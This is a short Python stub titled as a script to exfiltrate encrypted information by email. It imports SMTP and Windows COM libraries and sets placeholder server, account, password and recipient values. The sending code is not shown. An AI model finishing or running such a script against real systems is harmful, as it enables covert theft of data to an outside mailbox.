# Exfiltrate encrypted information

import smtplib # for cross-platform e-mail funct
import time 
import win32com.client # for win specific functs

smtp_server = 'smtp.example.com' # Connect to SMTP (Simple Mail Transfer Protocol Server)
smtp_port = 587 
smtp_acct = 'an@example.com'
smtp_password = 'seKret'
tgt_accts = ['an@elsewhere.com']


